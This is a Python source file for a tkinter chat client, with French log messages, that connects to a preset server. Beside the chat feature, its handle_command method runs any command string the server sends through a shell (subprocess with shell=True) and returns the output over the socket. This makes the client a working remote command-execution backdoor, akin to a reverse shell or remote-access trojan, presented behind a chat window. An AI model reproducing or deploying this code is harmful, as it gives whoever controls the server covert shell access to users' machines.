"""
Main client implementation.
"""

import tkinter as tk
import threading
import subprocess
import signal
from src.network.socket_manager import SocketManager
from src.network.message_handler import MessageHandler
from src.gui.client_gui import ClientGUI
from src.utils.constants import DEFAULT_HOST, DEFAULT_PORT
from src.utils.logger import Logger

class Client:
    """Main client class."""
    
    def __init__(self):
        """Initialize the client."""
        self.logger = Logger("Client")
        self.socket_manager = SocketManager(DEFAULT_HOST, DEFAULT_PORT)
        self.message_handler = MessageHandler()
        
        self.setup_gui()
        self.setup_message_handlers()
        self.setup_signal_handlers()
    
    def setup_signal_handlers(self) -> None:
        """Set up signal handlers for graceful shutdown."""
        signal.signal(signal.SIGINT, self.handle_signal)
        signal.signal(signal.SIGTERM, self.handle_signal)
    
    def handle_signal(self, signum, frame) -> None:
        """
        Handle system signals.
        
        Args:
            signum: Signal number
            frame: Current stack frame
        """
        self.logger.info("Signal reçu, arrêt du client...")
        self.running = False
        self.cleanup()
        self.root.quit()
    
    def setup_gui(self) -> None:
        """Set up the client GUI."""
        self.root = tk.Tk()
        self.gui = ClientGUI(self.root)
        
        # Bind window close event
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
    
    def setup_message_handlers(self) -> None:
        """Set up message handlers."""
        self.message_handler.register_handler(
            "command",
            lambda _, data: self.handle_command(data)
        )
        self.message_handler.register_handler(
            "chat",
            lambda _, data: self.handle_chat(data)
        )
        self.message_handler.register_handler(
            "exit",
            lambda _, __: self.handle_exit()
        )
    
    def start(self) -> None:
        """Start the client."""
        try:
            self.socket_manager.create_client_socket()
            self.logger.info(f"Connecté au serveur {DEFAULT_HOST}:{DEFAULT_PORT}")
            
            # Start message processing thread
            self.running = True
            message_thread = threading.Thread(target=self.process_messages)
            message_thread.daemon = True
            message_thread.start()
            
            # Start GUI main loop
            self.root.mainloop()
            
        except Exception as e:
            self.logger.error(f"Erreur lors de la connexion au serveur: {e}")
            self.cleanup()
    
    def process_messages(self) -> None:
        """Process incoming messages."""
        try:
            while self.running:
                data = self.socket_manager.receive_data()
                if not data:
                    break
                
                self.message_handler.process_message(0, data)
                
        except Exception as e:
            if self.running:  # Only log if we're still running
                self.logger.error(f"Erreur lors du traitement des messages: {e}")
        finally:
            self.handle_exit()
    
    def handle_command(self, command: str) -> None:
        """
        Handle command message.
        
        Args:
            command: Command to execute
        """
        try:
            # Execute command
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Get output
            stdout, stderr = process.communicate()
            output = stdout if stdout else stderr
            
            # Send response
            self.socket_manager.send_data(f"response:{output}")
            
        except Exception as e:
            self.logger.error(f"Erreur lors de l'exécution de la commande: {e}")
            self.socket_manager.send_data(f"response:Erreur: {str(e)}")
    
    def handle_chat(self, message: str) -> None:
        """
        Handle chat message.
        
        Args:
            message: Chat message
        """
        self.gui.log_chat("Serveur", message)
    
    def handle_exit(self) -> None:
        """Handle exit message."""
        self.running = False
        self.cleanup()
        self.root.quit()
    
    def send_chat(self, message: str) -> None:
        """
        Send chat message.
        
        Args:
            message: Message to send
        """
        try:
            self.socket_manager.send_data(f"chat:{message}")
        except Exception as e:
            self.logger.error(f"Erreur lors de l'envoi du message: {e}")
    
    def on_close(self) -> None:
        """Handle window close event."""
        if tk.messagebox.askokcancel("Quitter", "Voulez-vous vraiment quitter ?"):
            self.handle_exit()
    
    def cleanup(self) -> None:
        """Clean up resources."""
        self.running = False
        try:
            self.socket_manager.send_data("exit:")
        except:
            pass
        finally:
            self.socket_manager.close()

if __name__ == "__main__":
    client = Client()
    client.start() 